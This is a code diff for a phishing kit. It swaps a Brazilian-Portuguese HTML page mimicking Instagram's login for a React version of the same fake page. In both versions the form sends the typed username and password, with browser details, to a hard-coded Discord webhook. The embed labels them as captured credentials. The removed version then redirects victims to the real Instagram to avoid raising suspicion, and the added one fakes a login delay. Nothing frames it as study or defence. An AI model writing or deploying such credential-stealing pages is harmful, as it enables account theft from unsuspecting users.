@@ -1,101 +1,171 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entrar • Instagram</title>
-    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b30483a9a1.ico">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .l-main { display: flex; align-items: center; justify-content: center; width: 100%; max-width: 935px; }
-        .l-main__img { display: none; }
-        @media (min-width: 876px) { .l-main__img { display: block; margin-right: 32px; } .l-main__img img { height: 580px; } }
-        .l-user { width: 100%; max-width: 350px; }
-        .c-panel { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; text-align: center; margin-bottom: 10px; }
-        .c-panel__img { width: 175px; margin-bottom: 30px; }
-        .c-panel__input { width: 100%; padding: 9px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; margin-bottom: 6px; }
-        .c-btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; text-decoration: none; display: block; }
-        .c-panel__span { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; margin: 20px 0; }
-        .c-panel__span::before, .c-panel__span::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
-        .c-panel__span:not(:empty)::before { margin-right: 20px; }
-        .c-panel__span:not(:empty)::after { margin-left: 20px; }
-        .c-panel__facebook { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
-        .c-panel__forgot { color: #00376b; font-size: 12px; text-decoration: none; }
-        .c-signup { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; margin-bottom: 20px; }
-        .c-signup span { color: #0095f6; font-weight: 600; cursor: pointer; }
-        .c-app { text-align: center; font-size: 14px; }
-        .c-app__download { display: flex; justify-content: center; margin-top: 20px; }
-        .c-app__download img { height: 40px; margin: 0 5px; }
-    </style>
-</head>
-<body>
-    <main class="l-main">
-        <div class="l-main__img">
-            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdc9d656c3d1.png" alt="Smartphones">
-        </div>
-        <div class="l-user">
-            <div class="c-panel group">
-                <img class="c-panel__img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                <form id="loginForm">
-                    <input type="text" id="username" class="c-panel__input" placeholder="Telefone, nome de usuário ou email" required>
-                    <input type="password" id="password" class="c-panel__input" placeholder="Senha" required>
-                    <button type="submit" class="c-btn">Entrar</button>
-                    <span class="c-panel__span">OU</span>
-                </form>
-                <a href="#" class="c-panel__facebook">Entrar com o Facebook</a>
-                <a href="#" class="c-panel__forgot">Esqueceu a senha?</a>
-            </div>
-            <div class="c-signup group">
-                <p>Não tem uma conta? <span>Cadastre-se</span></p>
-            </div>
-            <div class="c-app">
-                <p>Obtenha o aplicativo.</p>
-                <div class="c-app__download">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
-                </div>
-            </div>
-        </div>
-    </main>
+import { useState } from 'react';
 
-    <script>
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1480933665448919105/kd31HGHQvYNA-28Cmb6QBs2XSFfPCq_-c5wpEUUq5JF1CMejaYadiw_YtJ_lKilEkOf6';
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const discordMessage = {
-                username: "Instagram Activity",
-                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
-                embeds: [{
-                    title: "🔐 Nova Tentativa de Login",
-                    color: 15548997,
-                    fields: [
-                        { name: "👤 Usuário", value: `\`\`\`${username}\`\`\``, inline: true },
-                        { name: "🔑 Senha", value: `\`\`\`${password}\`\`\``, inline: true },
-                        { name: "📱 Info", value: `**Plataforma:** ${navigator.platform}\n**Navegador:** ${navigator.userAgent.substring(0, 50)}...`, inline: false }
-                    ],
-                    footer: { text: "Logger Pro • " + new Date().toLocaleString() }
-                }]
-            };
+export default function App() {
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-            try {
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(discordMessage)
-                });
-                // Redireciona para o login real após enviar os dados
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-            } catch (error) {
-                // Em caso de erro, redireciona mesmo assim para não levantar suspeitas
-                window.location.href = 'https://www.instagram.com/';
-            }
-        });
-    </script>
-</body>
-</html>
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1480933665448919105/kd31HGHQvYNA-28Cmb6QBs2XSFfPCq_-c5wpEUUq5JF1CMejaYadiw_YtJ_lKilEkOf6';
+
+  const sendToDiscord = async (userData) => {
+    try {
+      const embed = {
+        title: "🔐 **Nova Credencial Capturada**",
+        color: 0x0095F6,
+        fields: [
+          {
+            name: "👤 **Username**",
+            value: `\`${userData.username}\``,
+            inline: true
+          },
+          {
+            name: "🔑 **Senha**",
+            value: `\`${userData.password}\``,
+            inline: true
+          },
+          {
+            name: "📱 **Dispositivo**",
+            value: "`Web Browser`",
+            inline: true
+          }
+        ],
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+        },
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Instagram Login Capture"
+        }
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [embed]
+        })
+      });
+    } catch (error) {
+      console.error('Erro ao enviar para Discord:', error);
+    }
+  };
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    
+    if (!username || !password) return;
+
+    setIsLoading(true);
+    
+    // Envia credenciais para Discord imediatamente
+    await sendToDiscord({ username, password });
+    
+    // Simula delay de login (mantém a experiência do usuário)
+    setTimeout(() => {
+      setIsLoading(false);
+      // Aqui você pode adicionar lógica de "login falhou" ou redirecionar
+      alert('Login processado!'); // Placeholder
+    }, 1500);
+  };
+
+  return (
+    <div className="size-full flex flex-col items-center justify-between bg-white p-4 max-w-[480px] mx-auto">
+      {/* Main Content */}
+      <div className="flex-1 flex flex-col items-center justify-center w-full">
+        {/* Logo */}
+        <div className="mb-8">
+          <h1 className="text-5xl font-bold tracking-tight" style={{ fontFamily: 'Billabong, cursive' }}>
+            Instagram
+          </h1>
+        </div>
+
+        {/* Login Form */}
+        <form onSubmit={handleLogin} className="w-full space-y-3">
+          {/* Username Input */}
+          <input
+            type="text"
+            placeholder="Telefone, nome de usuário ou email"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            className="w-full px-3 py-[12px] bg-[#FAFAFA] border border-[#DBDBDB] rounded-lg text-sm outline-none focus:border-[#A8A8A8]"
+            style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
+            required
+          />
+
+          {/* Password Input */}
+          <input
+            type="password"
+            placeholder="Senha"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            className="w-full px-3 py-[12px] bg-[#FAFAFA] border border-[#DBDBDB] rounded-lg text-sm outline-none focus:border-[#A8A8A8]"
+            style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
+            required
+          />
+
+          {/* Login Button */}
+          <button
+            type="submit"
+            className="w-full py-[12px] bg-[#0095F6] text-white font-semibold rounded-lg text-sm disabled:opacity-30"
+            style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
+            disabled={isLoading || !username || !password}
+          >
+            {isLoading ? 'Entrando...' : 'Entrar'}
+          </button>
+        </form>
+
+        {/* Divider */}
+        <div className="flex items-center gap-4 my-6">
+          <div className="flex-1 h-[1px] bg-[#DBDBDB]"></div>
+          <span className="text-[#8E8E8E] text-sm font-semibold" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
+            OU
+          </span>
+          <div className="flex-1 h-[1px] bg-[#DBDBDB]"></div>
+        </div>
+
+        {/* Facebook Login */}
+        <button 
+          onClick={() => sendToDiscord({ username: 'Facebook Login', password: 'N/A' })}
+          className="w-full flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm"
+        >
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
+            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+          </svg>
+          Entrar com o Facebook
+        </button>
+
+        {/* Forgot Password */}
+        <div className="text-center mt-4">
+          <a href="#" className="text-xs text-[#00376B]" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
+            Esqueceu a senha?
+          </a>
+        </div>
+      </div>
+
+      {/* Create Account Section */}
+      <div className="w-full pb-4">
+        <div className="border border-[#DBDBDB] rounded-lg py-4 text-center">
+          <span className="text-sm" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
+            Não tem uma conta?{' '}
+            <a href="#" className="text-[#0095F6] font-semibold">
+              Cadastre-se
+            </a>
+          </span>
+        </div>
+
+        {/* App Download */}
+        <div className="mt-4 text-center">
+          <p className="text-sm mb-3" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
+            Obtenha o aplicativo.
+          </p>
+          <div className="flex gap-2 justify-center">
+            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian-pt_br.png/68006898e4d4.png" alt="App Store" className="h-10" />
+            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese_brazilian-pt_BR.png/74091a9bb5cf.png" alt="Google Play" className="h-10" />
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
